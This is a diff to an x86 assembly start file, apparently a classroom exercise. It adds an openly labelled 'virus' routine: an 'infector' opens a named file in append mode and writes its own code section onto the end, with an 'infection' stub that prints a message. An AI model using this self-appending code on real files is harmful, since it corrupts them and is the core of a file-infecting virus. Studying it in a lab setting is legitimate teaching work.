@@ -1,7 +1,30 @@
+%define stdout          1
+
+%define syscall_exit    1
+%define syscall_write   4
+
+%define O_WRONLY        0x1
+%define O_APPEND        0x400
+
+
 section .text
+    virus_msg: db "Hello, Infected File", 0x0A, 0
+    len_virus_msg: equ $-virus_msg
+    virus_attached: db "VIRUS ATTACHED", 0x0A, 0
+    len_virus_attached: equ $-virus_attached
+    new_line: db 0x0A, 0
+    
+
+section .text
+
 global _start
 global system_call
+global infection
+global infector 
+
 extern main
+extern strlen
+
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
@@ -17,10 +40,11 @@ _start:
     call    main        ; int main( int argc, char *argv[], char *envp[] )
 
     mov     ebx,eax
-    mov     eax,1
+    mov     eax,syscall_exit
     int     0x80
     nop
-        
+
+
 system_call:
     push    ebp             ; Save caller state
     mov     ebp, esp
@@ -38,3 +62,117 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+
+code_start:
+
+
+infection:  
+    push    ebp
+    mov     ebp, esp
+    pushad
+
+    mov     edx, len_virus_msg
+    mov     eax, syscall_write
+    mov     ebx, stdout
+    mov     ecx, virus_msg
+
+    int     0x80
+
+    cmp     eax, 0
+    jle     infection_error
+
+    popad
+    pop     ebp
+    ret
+
+
+infection_error:
+    popad
+    pop ebp
+    mov eax, 1
+    mov ebx, 0x55
+    int 0x80
+
+
+infector:
+    push ebp
+    mov ebp, esp
+    sub esp, 4     
+
+    pushad ; save state
+
+    ; 1) print the given filename
+    push dword [ebp+8]
+    call strlen
+    add esp, 4
+
+    mov edx, eax
+    mov ecx, [ebp+8]
+    mov ebx, stdout
+    mov eax, syscall_write
+    int 0x80
+
+    mov edx, 1
+    mov ecx, new_line
+    mov ebx, stdout
+    mov eax, syscall_write
+    int 0x80
+
+    cmp eax, 0
+    jle error
+
+    ; 2) open the file
+    mov eax, 5
+    mov ebx, [ebp+8]
+    mov ecx, O_WRONLY | O_APPEND
+    mov edx, 0777
+    int 0x80
+
+    cmp eax, -1
+    je error
+
+    mov [ebp-4], eax
+
+    ; 3) add the code
+    mov eax, 4
+    mov ebx, [ebp - 4]
+    mov ecx, code_start
+    mov edx, code_end
+    sub edx, code_start
+    int 0x80
+
+    cmp eax, 0
+    jle error
+
+  ; 4) close the file
+    mov eax, 6
+    mov ebx, [ebp - 4]
+    int 0x80
+
+    cmp eax, -1
+    je error
+
+    mov edx, len_virus_attached
+    mov ecx, virus_attached
+    mov ebx, stdout
+    mov eax, syscall_write
+    int 0x80
+
+    popad
+
+    add esp, 4
+    pop ebp
+    ret
+
+
+error:
+    popad
+    add esp, 4
+    pop ebp
+    mov eax, 1
+    mov ebx, 0x55
+    int 0x80
+
+
+code_end:
